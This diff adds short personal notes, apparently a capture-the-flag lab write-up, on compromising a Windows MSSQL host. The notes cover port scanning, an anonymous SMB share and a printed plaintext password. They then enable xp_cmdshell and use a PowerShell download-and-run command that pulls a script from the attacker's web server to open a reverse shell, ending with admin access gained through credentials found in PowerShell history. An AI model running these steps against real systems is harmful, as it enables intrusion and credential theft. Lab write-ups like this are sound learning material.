@@ -1,0 +1,66 @@
+Used masscan to scan for open ports before using nmap
+
+	masscan -p80,8000-8100 10.0.0.0/8
+
+Used nmap with T4 option and port range based on masscan output 
+	sudo nmap -T4 -sC -sV -O -p1-3000 10.10.10.27
+
+Found a MSSQL server, used smbclient to check for shares 
+
+	smbclient -N -L \\\\10.10.10.27\\
+
+found a backups directory 
+
+	smbclient -N -L \\\\10.10.10.27\\backups
+
+found a password in plain text inside a config file
+
+	M3g4c0rp123
+
+connected to the server using the credentials and impacket's mssqlclient.py script.
+
+	python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth 
+
+checked for privileges with a SQL query 
+	
+	SELECT IS_SRVROLEMEMBER ('sysadmin') 
+
+This returns 1
+
+changed SQL Server config with folloeing commands
+
+	EXEC sp_configure 'Show Advanced Options', 1;
+	reconfigure;
+	sp_configure;
+	EXEC sp_configure 'xp_cmdshell', 1
+	reconfigure;
+	xp_cmdshell "whoami"
+
+No admin privileges so far on sql_svc
+created shell.psq file to get a reverse shell
+
+Proceeded to get a reverse shell with the following steps
+Raised a web server with python
+	python3 -m http.server 80
+
+used netcat to raise a listener and ufw to raise firewall rules to allow inbound connections
+
+	nc -lvnp 443
+	ufw allow from 10.10.10.27 proto tcp to any port 80,443 
+
+Logged into the SQL server again and sent the shell
+	
+	xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"
+
+Through the netcat connection, used powershell commands to show powershell command history
+
+	type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+Found credentials on command history. Used these to log in as admin with psexec.py from impacket
+
+	python3 psexec.py administrator@10.10.10.27 
+
+using whoami I notice I obtained root access
+	
+	Retrieved admin's flag from Desktop
+	
